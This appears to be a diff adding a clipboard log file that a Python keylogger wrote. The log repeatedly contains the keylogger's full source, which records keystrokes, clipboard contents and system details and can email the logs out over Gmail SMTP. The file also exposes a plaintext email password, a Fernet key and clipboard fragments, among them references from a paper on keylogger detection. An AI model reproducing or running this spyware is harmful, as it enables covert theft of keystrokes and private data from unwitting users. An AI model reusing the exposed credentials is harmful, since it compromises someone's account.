+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec=Clipboard Data: 
+4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec=Clipboard Data: 
+4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec=Clipboard Data: 
+4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec=Clipboard Data: 
+4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec=Clipboard Data: 
+aws configureClipboard Data: 
+aws configureClipboard Data: 
+aws configureClipboard Data: 
+s.quit()Clipboard could be not be copiedClipboard could be not be copiedClipboard Data: 
+REFERENCES [1] C.-C. C. Chieh-Ning Lien, "Keylogger Defender," UCLA Computer Science Department, Los Angeles, CA 90095, USA, 2005. [2] C. a. Solms, "Implementing Rootkits to address operating system vulnerabilities," presented at the. Academy of computer science and softwar engineering , Universtiy of Johannesburg.Johannesburg, South Africa., 2011. [3] M. Aslam, R. N. Idrees, M. M. Baig, and M. A.Arshad, “Antihook shield against the software key loggers,” in Proceedings of the National Conference of Emerging Technologies, 2004. [4] E. S. L. Martignoni, M. Fredrikson, S. Jha, and J. C. Mitchell, "A layered architecture for detecting malicious behaviors,”.Heidelberg.2008 [5] C. Y. D. Le, T. Smart, and H. Wang, , "Detecting kernel level keyloggers through dynamic taint  analysis," College of William & Mary, Department of Computer Science, illiamsburg,, 2008. [6] C. G. S.Ortani, and Crispo.”Bait your Hook: A novel Detection technique for    keylogger”. University of Trento, Via Sommarive.Trento, Italy.2010. [7] S. S. a. Anith.”Detecting keylogger based on traffic analysis with periodic behavior”PSG College of Technology, Coimbatore, India.2011     [8] C. a. Rajendra.”Keylogger in Cybersecurtiy Education”. Rechester Institute of  Technology,Rechester,New York,USA. [9] T. Olzak.” Keystroke Logging Keylogging” Erudio Security, LLC. 2008. [10] S. S. A. G. CANBEK. (2009) Keylogger Increasing Threats to Computer Security and Privacy. IEEE TECHNOLOGY AND SOCIETY MAGAZINE.Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard Data: 
+create ec2 instance using terraformon debian 10Clipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copied
